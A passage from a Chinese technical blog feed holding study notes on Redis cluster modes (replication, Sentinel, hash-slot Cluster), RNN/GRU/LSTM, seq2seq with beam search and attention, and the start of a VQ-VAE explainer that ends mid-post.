<h3 id="分片">分片</h3>
<p>在分片的概念中，需要按一定的规则，将数据分为若干个分区（partition），分布于各个节点上。分配规则可以是：</p>
<ul>
<li>MySQL
<ul>
<li>行分片：常用的按主键范围划分，例如 1-1w 在一个节点，1w-2w 在一个节点</li>
<li>列分片：也就是分表，将数据按数据库范式拆分，存储在不同节点</li>
</ul></li>
<li> Redis：使用 hash 将 key 转化为整数，再做范围划分</li>
</ul>
<p>切片的优势在于：</p>
<ul>
<li>写入高效，多个写操作命中不同的节点，互不影响，提高并发</li>
<li>读取昂贵：MySQL 中的联合、全表扫描操作效率降低，可能需要对多个节点加锁
<ul>
<li>对 Redis 还好</li>
</ul></li>
</ul>
<h2 id="redis-集群模式">Redis 集群模式</h2>
<h3 id="主从复制">主从复制</h3>
<p>主从复制、读写分离是存储中常用的提高性能、可用性的方法。Redis 也不例外。最直觉的集群模式，就是设置很多的从节点复制，写操作在主节点完成，主从之间通过 aof 日志 /rdb 文件同步。整个架构如下所示，一个主节点可能有多个从节点，从节点可能再会有自己的从节点。</p>
<p><img src="ms-mode.png"></p>
<p>主从复制的具体流程如下：</p>
<p><img src="ms-pipeline.png"></p>
<p>流程如下从数据库启动成功后，连接主数据库，发送 SYNC 命令；</p>
<ul>
<li>主数据库接收到 SYNC 命令后，<strong>开始执行 BGSAVE 命令生成 RDB
文件并使用缓冲区记录此后执行的所有写命令</strong>；</li>
<li>主数据库 BGSAVE
执行完后，向所有从数据库发送快照文件，并在发送期间继续记录被执行的写命令；</li>
<li>从数据库收到快照文件后丢弃所有旧数据，载入收到的快照；</li>
<li>主数据库快照发送完毕后开始向从数据库发送缓冲区中的写命令；</li>
<li>从数据库完成对快照的载入，开始接收命令请求，并执行来自主数据库缓冲区的写命令；（<strong>从数据库初始化完成</strong>）</li>
<li>主数据库每执行一个写命令就会向从数据库发送相同的写命令，从数据库接收并执行收到的写命令（<strong>从数据库初始化完成后的操作</strong>）</li>
<li>出现断开重连后，2.8 之后的版本会将断线期间的命令传给重数据库，增量复制。</li>
<li>主从刚刚连接的时候，进行全量同步；全同步结束后，进行增量同步。当然，如果有需要，slave
在任何时候都可以发起全量同步。Redis
的策略是，无论如何，首先会尝试进行增量同步，如不成功，要求从机进行全量同步。</li>
</ul>
<p>其他步骤都比较好理解，最开始困扰我的是这个 bgsave，它生成的 RDB 文件为什么能够记录某个时间数据库的准确状态？如果不是准确状态，写命令执行两次不是会有幂等性问题？后面了解才知道，<strong>bgsave 是通过 fork 与 copy
on write 实现的</strong>。</p>
<p>主从复制的优点基本就是复制操作的优点，就不赘述了，它的缺点在于：</p>
<ul>
<li>Redis 不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者<strong>手动切换前端的 IP 才能恢复</strong>（<strong>也就是要人工介入</strong>）；</li>
<li>主机宕机，宕机前有部分数据未能及时同步到从机，切换 IP 后还会引入数据不一致的问题，降低了系统的可用性；</li>
<li>如果多个 Slave
断线了，需要重启的时候，尽量不要在同一时间段进行重启。<strong>因为只要
Slave 启动，就会发送 sync 请求和主机全量同步，当多个 Slave
重启的时候，可能会导致 Master IO 剧增从而宕机</strong>。</li>
<li>Redis
较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂；</li>
</ul>
<p>需要注意的是，新启动 / 重启的节点都需要发送 sync
请求和主机全量同步，会影响主服务的稳定性。</p>
<h3 id="sentinel哨兵模式">Sentinel（哨兵）模式</h3>
<p>第一种主从同步 / 复制的模式，当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。消息队列 Kafka 使用的就是哨兵模式。</p>
<p>哨兵模式可以看成主从模式的扩展。首先 Redis
提供了哨兵的命令，<strong>哨兵是一个独立的进程，作为进程，它会独立运行。其原理是哨兵通过发送命令，等待 Redis 服务器响应，从而监控运行的多个
Redis 实例</strong>。</p>
<p><img src="single-sentinel.png"></p>
<p><strong>哨兵模式的作用</strong></p>
<ul>
<li>通过发送命令，让 Redis
服务器返回监控其运行状态，包括主服务器和从服务器；</li>
<li>当哨兵监测到 master 宕机，会自动将 slave 切换成 master
，然后通过<strong>发布订阅模式</strong>通知其他的从服务器，修改配置文件，让它们切换主机；</li>
</ul>
<p>然而一个哨兵进程对 Redis 服务器进行监控，也可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。</p>
<p><img src="multi-sentinel.png"></p>
<h4 id="故障切换的过程"><strong>故障切换的过程</strong></h4>
<p>假设主服务器宕机，哨兵 1 先检测到这个结果，系统并不会马上进行 failover
过程，仅仅是哨兵 1 主观的认为主服务器不可用，这个现象成为<strong>主观下线</strong>。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由一个哨兵发起，进行
failover
操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为<strong>客观下线</strong>。这样对于客户端而言，一切都是透明的。</p>
<h4 id="哨兵模式的工作方式">哨兵模式的工作方式：</h4>
<ul>
<li>每个 Sentinel（哨兵）进程以每秒钟一次的频率向整个集群中的 Master
主服务器，Slave 从服务器以及其他 Sentinel（哨兵）进程发送一个 PING
命令。</li>
<li>如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过
down-after-milliseconds 选项所指定的值， 则这个实例会被
Sentinel（哨兵）进程标记为主观下线（SDOWN）</li>
<li>如果一个 Master 主服务器被标记为主观下线（SDOWN），则正在监视这个
Master 主服务器的所有 Sentinel（哨兵）进程要以每秒一次的频率确认 Master
主服务器的确进入了主观下线状态</li>
<li>当有足够数量的
Sentinel（哨兵）进程（大于等于配置文件指定的值）在指定的时间范围内确认
Master 主服务器进入了主观下线状态（SDOWN）， 则 Master
主服务器会被标记为客观下线（ODOWN）</li>
<li>在一般情况下， 每个 Sentinel（哨兵）进程会以每 10
秒一次的频率向集群中的所有 Master 主服务器、Slave 从服务器发送 INFO
命令。</li>
<li>当 Master 主服务器被
Sentinel（哨兵）进程标记为客观下线（ODOWN）时，Sentinel（哨兵）进程向下线的
Master 主服务器的所有 Slave 从服务器发送 INFO 命令的频率会从 10
秒一次改为每秒一次。</li>
<li>若没有足够数量的 Sentinel（哨兵）进程同意 Master 主服务器下线，
Master 主服务器的客观下线状态就会被移除。若 Master 主服务器重新向
Sentinel（哨兵）进程发送 PING
命令返回有效回复，Master 主服务器的主观下线状态就会被移除。</li>
</ul>
<h4 id="哨兵模式的优缺点">哨兵模式的优缺点</h4>
<p><strong>优点：</strong></p>
<ul>
<li>哨兵模式是基于主从模式的，所有主从的优点，哨兵模式都具有。</li>
<li>主从可以自动切换，系统更健壮，可用性更高 (<strong>可以看作自动版的主从复制</strong>)。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>Redis 较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。</li>
</ul>
<h3 id="cluster-集群模式redis官方">Cluster 集群模式（Redis 官方）</h3>
<p>Redis Cluster 是一种服务器 Sharding 技术，3.0 版本开始正式提供。</p>
<p>Redis 的哨兵模式基本已经可以实现高可用，读写分离
，但是在这种模式下每台 Redis 服务器都存储相同的数据，很浪费内存，所以在
redis3.0 上加入了 Cluster 集群模式，实现了 Redis
的分布式存储，<strong>也就是说每台 Redis
节点上存储不同的内容</strong>。</p>
<p><img src="cluster.png"></p>
<p>在这个图中，每一个蓝色的圈都代表着一个 redis
的服务器节点。它们任何两个节点之间都是相互连通的。客户端可以与任何一个节点相连接，然后就可以访问集群中的任何一个节点。对其进行存取和其他操作。</p>
<h4 id="集群的数据分片"><strong>集群的数据分片</strong></h4>
<p>Redis 集群没有使用一致性 hash，而是引入了哈希槽【hash
slot】的概念。</p>
<p>Redis 集群有 16384 个哈希槽，每个 key 通过 CRC16 校验后对 16384
取模来决定放置哪个槽。集群的每个节点负责一部分 hash 槽，举个例子，比如当前集群有 3 个节点，那么：</p>
<ul>
<li>节点 A 包含 0 到 5460 号哈希槽</li>
<li>节点 B 包含 5461 到 10922 号哈希槽</li>
<li>节点 C 包含 10923 到 16383 号哈希槽</li>
</ul>
<p>这种结构很容易添加或者删除节点。比如如果我想新添加个节点 D ，
我需要从节点 A， B， C 中得部分槽到 D 上。如果我想移除节点 A ，需要将 A
中的槽移到 B 和 C 节点上，然后将没有任何槽的 A
节点从集群中移除即可。由于从一个节点将哈希槽移动到另一个节点并不会停止服务，所以无论添加删除或者改变某个节点的哈希槽的数量都不会造成集群不可用的状态。</p>
<p>在 Redis
的每一个节点上，都有这么两个东西，一个是插槽（slot），它的的取值范围是：0-16383。还有一个就是
cluster，可以理解为是一个集群管理的插件。当我们的存取的
Key 到达的时候，Redis 会根据 CRC16 的算法得出一个结果，然后把结果对 16384
求余数，这样每个 key 都会对应一个编号在 0-16383
之间的哈希槽，通过这个值，去找到对应的插槽所对应的节点，然后直接自动跳转到这个对应的节点上进行存取操作。</p>
<h4 id="redis-集群的主从复制模型">Redis 集群的主从复制模型</h4>
<p><strong>为了保证高可用，redis-cluster 集群引入了主从复制模型，一个主节点对应一个或者多个从节点，当主节点宕机的时候，就会启用从节点</strong>。当其它主节点
ping 一个主节点 A 时，如果半数以上的主节点与 A 通信超时，那么认为主节点
A 宕机了。如果主节点 A 和它的从节点 A1
都宕机了，那么该集群就无法再提供服务了。</p>
<h4 id="集群的特点"><strong>集群的特点</strong></h4>
<ul>
<li>所有的 redis
节点彼此互联 (PING-PONG 机制)，内部使用二进制协议优化传输速度和带宽。</li>
<li>节点的 fail 是通过集群中超过半数的节点检测失效时才生效。</li>
<li>客户端与 Redis
节点直连，不需要中间代理层。客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可。</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://segmentfault.com/a/1190000022808576">Redis 你了解
Redis 的三种集群模式吗？ - 个人文章 - SegmentFault 思否</a></li>
<li><a href="https://www.cnblogs.com/L-Test/p/11626124.html">Redis
==&gt; 集群的三种模式 - 破解孤独 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/xiaolei2017/p/15713194.html">Redis
中 bgsave 方式持久化的细节问题 - 百合叶 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://zhou-yuxin.github.io/articles/2017/fork()后copy%20on%20write的一些特性/index.html">fork () 后 copy
on write 的一些特性 (zhou-yuxin.github.io)</a></li>
<li><a href="https://www.cnblogs.com/Java3y/p/9884583.html">COW 奶牛！Copy On
Write 机制了解一下 - Java3y - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>copy on write</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>循环神经网络 RNN 及其变体 GRU、LSTM</title>
    <url>/blog/2021/07/22/rnns/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>同样，借着复习面试，把 RNN 家族再梳理回顾一下，包含 RNN、GRU、LSTM。
<span id="more"></span></p>
<h2 id="循环神经网络rnn">循环神经网络 RNN</h2>
<h3 id="模型结构">模型结构</h3>
<p><img src="rnn.png"></p>
<p>RNN 的结构如上图所示，其核心思想是使用同一套参数来更新状态<span class="math inline"> \(s\)</span> 与计算输出<span class="math inline"> \(o\)</span>，箭头右侧是按时序展开的模型结构图。可以看到，RNN 仅使用了一个状态<span class="math inline"> \(s\)</span>​来保存序列信息，共有三个参数矩阵。这一部分公式化描述如下:
<span class="math display">\[
s_t=f(Ux_t+Ws_{t-1})
\]</span></p>
<p><span class="math display">\[
o_t=g(Vs_t)
\]</span></p>
<p>其中，<span class="math inline">\(f\)</span> 与<span class="math inline"> \(g\)</span>​均为激活函数，激活函数可选的有 sigmoid，tanh，relu 等（下面会分析）。</p>
<p>RNN 有以下缺陷：</p>
<ul>
<li>容易发生梯度消失和梯度爆炸现象（由于导数连乘）。</li>
<li>难以捕捉长距离的依赖。</li>
</ul>
<p>在其中，梯度消失相对于梯度爆炸要更为严重，因为梯度爆炸是可以观测到的（NAN），梯度消失则难以直接观测。梯度爆炸问题很容易解决，可以通过梯度裁剪的方法进行解决。</p>
<h3 id="梯度消失和梯度爆炸">梯度消失和梯度爆炸</h3>
<p>梯度消失和爆炸的解决方法：</p>
<ul>
<li>梯度的剪切以及正则化（常见的是 l1 正则和 l2 正则）。</li>
<li>relu、elu 等激活函数。（梯度消失）</li>
<li>批标准化（<strong>Batch Normalization</strong>）。</li>
<li>残差结构（将映射 F (x) 改为 F (x)+x，使用 relu 激活函数的 F 在 x&lt;0 时能够无损传播梯度，保证了深层网络的性能）。</li>
<li>LSTM、GRU 等结构。</li>
</ul>
<h4 id="批标准化-batch-normalization">批标准化 Batch Normalization</h4>
<p>Batch
Normalization 是一种常用于 CNN 的正则化方法，可以分为两个步骤：</p>
<p>（1）标准化：对 batch 的数据求均值与标准差，将数据标准化到标准正态分布</p>
<p>（2）进行放缩与平移</p>
<p>整个过程类似于 VAE 的重参数化，先获得一个正态分布的变量，再进行放缩平移，达到从任意正态分布中取样的效果。</p>
<p>也就是说，batch normlization
假设每个 batch 的数据服从一个正态分布（参数 γ 和 β 学习得来，即通过 batch 数据计算得来），先将数据标准化，再放缩与平移，使得数据 “看起来” 是从这个正态分布中取样而来的。</p>
<p>在预测阶段，所有参数的取值是固定的，对 BN 层而言，意味着 μ、σ、γ、β 都是固定值。γ 和 β 比较好理解，随着训练结束，两者最终收敛，预测阶段使用训练结束时的值即可。</p>
<p>对于 μ 和 σ，在训练阶段，它们为当前 mini
batch 的统计量，随着输入 batch 的不同，μ 和 σ 一直在变化。在预测阶段，输入数据可能只有 1 条，该使用哪个 μ 和 σ，或者说，每个 BN 层的 μ 和 σ 该如何取值？可以采用训练收敛最后几批 mini
batch 的 μ 和 σ 的期望，作为预测阶段的 μ 和 σ。</p>
<h3 id="层标准化-layer-normalization">层标准化 Layer Normalization</h3>
<p>Batch
Normalization 是在 Batch 的方向上进行 Normalization。这种方法在 NLP 中不是很适合。由于文本序列的长度可变性，一个 batch 中的数据往往长度不同，进而对每个位置进行标准化不是很合适。</p>
<p>而 Layer
Normalization 则是在序列的方向上进行 Normalization。这使得它可以处理变长序列。</p>
<h3 id="激活函数">激活函数</h3>
<p>对于激活函数而言，sigmoid 的最大梯度为 0.25，因此很容易发生梯度消失现象，而 tanh 虽然最大梯度为 1，但也只有 0 处取得，也容易
发生梯度消失。因此 RNN 常使用 relu 作为激活函数。relu 的梯度非 0 即 1，这能够缓解梯度消失现象，但也有一定的问题：1.
容易发生梯度爆炸。（梯度恒为 1 时）2.
负数部分梯度恒为 0，部分神经元无法激活。elu 能够缓解 relu 的 0 梯度的问题，但是由于加入了幂运算，会更慢一点。</p>
<h2 id="门控循环单元gru">门控循环单元 GRU</h2>
<h3 id="模型结构-1">模型结构</h3>
<p>GRU 的思想是在 RNN 的基础上，引入门控信号来缓解 RNN 存在的梯度消失问题。模型结构如下：</p>
<p><img src="gru.png"></p>
<p>公式化描述如下（公式中的<span class="math inline"> \(\odot\)</span> 代表哈达玛积，即同型矩阵间逐元素乘法）：</p>
<p>首先根据输入<span class="math inline"> \(x_t\)</span> 与上一时刻隐藏状态<span class="math inline"> \(h_{t-1}\)</span> 计算得到两个门控状态<span class="math inline"> \(z_t\)</span> 与<span class="math inline"> \(r_t\)</span>​，假设<span class="math inline"> \(h_t\in \mathbb R^H\)</span>： <span class="math display">\[
z_t=sigmoid(W_zx_t+U_zh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
r_t=sigmoid(W_rx_t+U_rh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p>之后，使用重置门计算得到一个新的隐藏状态（即图中的<span class="math inline"> \(h’\)</span>）： <span class="math display">\[
\tilde h_t=tanh(Wx_t+U(r_t\odot h_{t-1}))\in \mathbb R^{H}
\]</span> 再使用更新门<span class="math inline"> \(z_t\)</span> 更新隐藏状态： <span class="math display">\[
h_t=(1-z)\odot h_{t-1}+z\odot \tilde h_t\in \mathbb R^{H}
\]</span></p>
<h2 id="长短期记忆网络lstm">长短期记忆网络 LSTM</h2>
<h3 id="模型结构-2">模型结构</h3>
<p>LSTM 的思想是在 RNN 的基础上，加入一个不易被改变的新状态<span class="math inline"> \(c_t\)</span>​​，代表的是 0-t 时刻的全局信息。而<span class="math inline"> \(h_t\)</span>​代表的是在 0~t-1 时刻全局信息的影响下，<span class="math inline">\(t\)</span> 时刻的信息。换而言之，<span class="math inline">\(c_t\)</span> 变化的很慢，而<span class="math inline"> \(h_t\)</span> 变化的很快。</p>
<p><img src="lstm.png"></p>
<p>公式化描述如下：</p>
<p>首先计算得到三个门控状态（分别对应图中的<span class="math inline"> \(z^i,z^f,z^o\)</span>）： <span class="math display">\[
i_t=sigmoid(W_ix_t+U_ih_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
f_t=sigmoid(W_fx_t+U_fh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p><span class="math display">\[
o_t=sigmoid(W_ox_t+U_oh_{t-1})\in \mathbb R^{H}
\]</span></p>
<p>以及一个与当前输入密切相关的向量（对应图中的<span class="math inline"> \(z\)</span>） <span class="math display">\[
\tilde c_t=tanh(W_zx_t+U_zh_{t-1})
\]</span> 接着，更新两种状态： <span class="math display">\[
c_t=f_t\odot c_{t-1}+i_t\odot \tilde c_t
\]</span></p>
<p><span class="math display">\[
h_t=o_t\odot tanh(c_t)
\]</span></p>
<p>其中，<span class="math inline">\(i_t.f_t,o_t\)</span> 分别代表信息、遗忘、输出门控。信息和遗忘门控负责 cell
state 的更新，输出门控负责 hidden
state 的更新。具体而言，LSTM 可以简单分为以下三个阶段：</p>
<ul>
<li>遗忘阶段，根据遗忘门控，忘记上一个 cell state 的部分信息。</li>
<li>记忆阶段，根据信息门控，将输入信息进行选择记忆。</li>
<li>输出阶段，根据输出门控，输出最终的状态。</li>
</ul>
<h3 id="lstm-vs-gru">LSTM VS GRU</h3>
<p>本质上，LSTM 和 GRU 都是通过引入门控信号来解决 RNN 的梯度消失问题。在实现方法上，GRU 相对于 LSTM 要更为简单。GRU 抛弃了 LSTM 中的 hidden
state（GRU 中的 hidden state 实际上是 LSTM 中的 cell
state），因为 LSTM 中的<span class="math inline"> \(h_t\)</span> 只是想保存当前时刻的信息，这一部分已经包含到 GRU 中的<span class="math inline"> \(\tilde h_t\)</span> 中了。cell
state 中的之前的全局信息与当前时刻的信息应当是一个此消彼长的状态，GRU 因此直接使用一个门控信号<span class="math inline"> \(z_t\)</span> 同时控制了遗忘和更新。</p>
<p>在参数上，GRU 有着比 LSTM 更少的参数，收敛速度更快，并且与 LSTM 有着差不多的性能表现，因此实际工程中多使用 GRU。</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/68579467">深度学习之 3—— 梯度爆炸与梯度消失
- 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/32481747">人人都能看懂的 GRU -
知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/32085405">人人都能看懂的 LSTM -
知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/55386469#:~:text=这里归纳一下%20LSTM%20与%20GRU%20的区别：%20首先，,LSTM%20选择暴露部分信息（%20才是真正的输出，%20只是作为信息载体，并不输出">RNN
vs LSTM vs GRU -- 该选哪个？ - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>循环神经网络</category>
      </categories>
      <tags>
        <tag>RNN</tag>
        <tag>GRU</tag>
        <tag>LSTM</tag>
      </tags>
  </entry>
  <entry>
    <title>序列到序列模型</title>
    <url>/blog/2021/07/22/seq2seq/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>序列到序列模型（sequence to sequence,
seq2seq）是自然语言处理中的一个重要模型，在机器翻译、对话系统等多个领域都有着广泛的应用。今天借着准备面试的机会，将这一部分知识整理出一篇博客。</p>
<span id="more"></span>
<h2 id="seq2seq">seq2seq</h2>
<p><img src="basemodel.png"></p>
<p>seq2seq 模型常用语序列间的转化任务，其结构如上图所示，主要由两部分组成：</p>
<ul>
<li>编码器，常见为循环神经网络，用以将输入序列编码为固定维度的向量（即最后时刻编码器的隐藏状态），进而投喂给解码器进行解码。</li>
<li>解码器，同样常见为循环神经网络，用以根据向量输出最终序列。可以看做一个条件语言模型，“条件” 即为输入序列。因此，可以使用预训练的语言模型初始化权重，再进行 fine-tune。</li>
</ul>
<p>在训练阶段，解码器的输出仅用于计算损失，解码器的输入是编码器得到的上下文状态向量 (最后一个时间步的隐藏状态) 和目标序列当前的单词。换而言之，训练时，解码器的输出一定是与目标序列等长的。</p>
<p>在推理阶段，解码器每一个时间步的输出是下一个时间步的输入。可以通过限制输出序列的最大长度或者在输出结束标志后停止。对于 batch 的数据，往往使用限制最大长度，再删去结束标志之后的部分。</p>
<p>seq2seq 虽然简单有效，但存在以下的缺点：</p>
<ul>
<li>输入序列过长时，固定长度的向量无法存储全部的信息，进而造成信息丢失。</li>
<li>贪婪解码问题，下面会提到。</li>
</ul>
<h2 id="贪婪解码问题">贪婪解码问题</h2>
<p>对于 seq2seq 模型，我们希望得到概率最大的输出序列，即建模的是<span class="math inline"> \(\arg\max_YP(Y|X)\)</span>（<span class="math inline">\(X\)</span> 为输入序列，<span class="math inline">\(Y\)</span> 为输出序列）。然而事实上，解码器每一步求解的是<span class="math inline"> \(\arg\max_{y_t}P(y_t|y_{t-1:1},X)\)</span>​，即当前时间步概率最大的单词。这样以来，整个解码的过程就是贪婪的，每一步的单词概率最大并不意味着整个句子的概率最大。</p>
<p>怎么解决这个问题呢？解决方法是 beam
search（光束搜索）。核心思想是，在推理阶段（训练时不需要，因为知道 ground
truth），</p>
<p>保留 k 个可能性最大的序列（可能性以概率相乘的对数作为分数，即<span class="math inline"> \(\sum_{i=1}^tlogP_{I,M}(y_i|y_{i-1:1},X)\)</span>​）。</p>
<p>当某个序列输出终止符号时，可以认作该序列已经结束，继续维护其他序列。</p>
<p>搜索的终止条件可以根据任务具体选择，例如：</p>
<ul>
<li>最多搜索多长时间步（例如 30 步）。</li>
<li>至少拥有多少个候选序列（例如 10 个）。</li>
</ul>
<p>在搜索结束，得到若干个候选序列后，将序列分数标准化后，即<span class="math inline"> \(\frac{1}{t}\sum_{i=1}^tlogP_{I,M}(y_i|y_{i-1:1},X)\)</span>​作为最终的分数。这样是为了避免短序列概率更大（概率连乘的数量小），然后选择概率最大的序列。</p>
<p>在搜索时，分数不需要进行标准化，因为搜索时处理的序列总是等长的。</p>
<h2 id="注意力机制">注意力机制</h2>
<p>为了解决 seq2seq 在面对长序列时的信息丢失问题，研究者们在 seq2seq 中引入了注意力（Attention）机制。借助于注意力机制，解码器能够在解码时与输入序列直接相连，还可以关注到输入序列的不同部分。公式化描述如下：</p>
<p>首先根据编码器状态<span class="math inline"> \({h_1,\dots,h_N}\)</span> 与当前解码器状态<span class="math inline"> \(s_t\)</span> 点乘计算分数 <span class="math display">\[
e^t=[s_t^\intercal h_1,\dots,s_t^\intercal h_N]\in \mathbb R^N
\]</span> 将分数归一化后作为输入序列与当前位置相关性的概率分布： <span class="math display">\[
\alpha^t=softmax(e^t)\in \mathbb R ^N
\]</span> 加权求和后作为最终的注意力结果： <span class="math display">\[
\alpha_t=\sum_{i=1}^N\alpha_i^th_i\in \mathbb R^h
\]</span> 将注意力结果与解码器隐藏状态拼接后计算新的隐藏状态<span class="math inline"> \(\hat s_t\)</span>，再计算输出。 <span class="math display">\[
[\alpha_t;s_t]\in \mathbb R^{2h}
\]</span> 带有 Attention 的 seq2seq 的简单示意图如下：</p>
<p><img src="model.png"></p>
<h3 id="广义的attention机制">广义的 Attention 机制</h3>
<p>广义的 attention 定义如下：给定一组向量 values，一个向量 query，attention 是 value 的加权和，权重是某个相似性度量函数，例如点积、加性注意力等。</p>
<p>度量函数可以为：</p>
<ul>
<li><p>点乘：<span class="math inline">\(e_i=s^\intercal h_i\in \mathbb
R\)</span></p></li>
<li><p> 乘法注意力：<span class="math inline">\(e_i=s^\intercal Wh_i \in
\mathbb R\)</span>​（其中<span class="math inline"> \(W\in \mathbb
R^{d_2*d_1}\)</span> 为权重矩阵）</p></li>
<li><p>加法注意力：<span class="math inline">\(e_i=v^\intercal
tanh(W_1h_i+W_2s)\in \mathbb R\)</span>​（其中<span class="math inline"> \(W_1,W_2\)</span> 为权重矩阵，<span class="math inline">\(v\)</span> 是权重向量）</p></li>
</ul>
<p>对应到 seq2seq 的 Attention 机制中，query 向量为解码器隐藏状态，values 为编码器的全部隐藏状态，度量函数为点乘。</p>
<p>联想一下 BERT 的自注意力机制：</p>
<p>对于每个单词向量，通过 Query、Key、Value 三个参数矩阵计算得到三个向量：q,k,v。在每个位置，使用当前位置的 query 向量与每个位置的 key 做点乘，作为相似性度量，再对 value 矩阵加权求和。公式如下：
<span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>seq2seq</category>
      </categories>
      <tags>
        <tag>seq2seq</tag>
      </tags>
  </entry>
  <entry>
    <title>量子变分自编码器 VQ-VAE</title>
    <url>/blog/2021/07/15/vq-vae/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>VQ-VAE（Vector Quantised - Variational
AutoEncoder，量子变分自编码器）出自 2017 年 Google 团队的论文 Neural Discrete
Representation Learning。顾名思义，VQ-VAE 是 VAE（ Variational
AutoEncoder，变分自编码器）的变种。主要是为了解决 VAE 所存在的” 后验坍塌 “问题。VQ-VAE 与 VAE 的主要区别在于：</p>
<ul>
<li>隐变量是离散的，而非连续的</li>
<li>先验分布是学习得来的，而非固定不变的</li>
</ul>
<span id="more"></span>
<h2 id="研究动机与背景">研究动机与背景</h2>
<h3 id="离散型隐变量">离散型隐变量</h3>
<p>离散型隐变量对于某些任务是更为自然与恰当的，例如语言是由离散的字符组成的，图像的像素是 0-255 的自然数。然而，离散 VAE 往往难以训练，现有的训练方法无法弥补其与连续型 VAE 存在的性能上的差距。尽管连续型 VAE 会存在后验坍塌问题，但是由于从高斯分布中使用重参数化技巧采样隐变量，连续型 VAE 中能够获得方差更小，即更稳定的参数梯度。</p>
<h3 id="自回归模型">自回归模型</h3>
<p>自回归模型（<strong>A</strong>uto<strong>r</strong>egressive
model）是一种处理时间序列的方法，使用<span class="math inline"> \(x_1,x_2,\dots,x_{t-1}\)</span> 来预测<span class="math inline"> \(x_t\)</span>，并假设它们是线性关系。由于其使用<span class="math inline"> \(x\)</span> 本身来预测<span class="math inline"> \(x\)</span>，因而得名为自回归模型。形式化来讲，自回归模型定义如下：
<span class="math display">\[
X_t=c+\sum_{i=1}^p\phi_iX_{t-i}+\epsilon_t
\]</span> 其中，<span class="math inline">\(c\)</span> 是常数项，<span class="math inline">\(\epsilon_t\)</span> 假设为一个均值为 0，标准差为<span class="math inline"> \(\sigma\)</span> 的随机误差。</p>
<p>典型的自回归模型有循环神经网络（Recurrent Neural Network,
RNN），PixelCNN 等。下面以文中提到的 PixelCNN 为例进行介绍。</p>
<p>PixelCNN 是虽然是 CNN，但它与传统的 CNN 不同，而是参考了 RNN 的思路，将图片扁平化为一维后，将其看成时间序列进行逐像素的生成。即：
<span class="math display">\[
\begin{align}
p(x)&amp;=p(x_1,x_2,\dots,x_t)\\
&amp;=p(x_1)p(x_2|x_1)\dots p(x_t|x_1,x_2,\dots,x_{t-1})
\end{align}
\]</span> 可以看到，符合上述的自回归模型的定义（令<span class="math inline"> \(X_t=p(x_1,x_2,\dots,x_t)\)</span>）。</p>
<h3 id="变分自编码器">变分自编码器</h3>
<p>变分自编码器（Variational
AutoEncoder，VAE）是一类重要的生成模型。由于篇幅原因这里只做简单介绍，后面可能会单独出一篇博客介绍。VAE 假设存在一个无法观测的隐变量<span class="math inline"> \(z\)</span> 控制数据<span class="math inline"> \(x\)</span> 的生成，它主要由以下几部分组成：</p>
<ul>
<li>编码网络，拟合后验分布<span class="math inline"> \(q(z|x)\)</span>
，将数据<span class="math inline"> \(x\)</span> 映射到连续隐变量<span class="math inline"> \(z\)</span></li>
<li> 生成网络，拟合分布<span class="math inline"> \(p(x|z)\)</span></li>
<li> 隐变量的先验分布<span class="math inline"> \(p(z)\)</span></li>
</ul>
<p>在训练过程中，从<span class="math inline"> \(q(z|x)\)</span> 中采样隐变量<span class="math inline"> \(z\)</span> 来重构数据。在推理过程中，从<span class="math inline"> \(p(z)\)</span> 中采样隐变量来生成数据。</p>
<h2 id="模型细节">模型细节</h2>
<p>整体结构如下图所示：</p>
<p><img src="model.png"></p>
<h3 id="离散隐变量">离散隐变量</h3>
<p>模型定义了一个<span class="math inline"> \(K*D\)</span> 的隐变量嵌入空间，其中<span class="math inline"> \(K\)</span> 为空间大小，<span class="math inline">\(D\)</span> 为隐变量向量的维度。在得到编码网络的输出<span class="math inline"> \(z_e(x)\)</span> 后，通过<strong>最近邻算法</strong>将其映射为隐变量嵌入空间中的某个隐变量<span class="math inline"> \(e_k\)</span>（简记为<span class="math inline"> \(z\)</span>），投喂到解码器。后验分布<span class="math inline"> \(q(z|x)\)</span> 定义为如下的独热分布： <span class="math display">\[
q(z=k|x) = \begin{cases}
1 &amp;if\ k=\arg\min_j||z_e(x)-e_j|| , \\
0 &amp; otherwise.
\end{cases}
\]</span> 进而： <span class="math display">\[
z_q(x)=e_k, where\ k=\arg\min_j||z_e(x)-e_j||
\]</span></p>
<h3 id="梯度计算">梯度计算</h3>
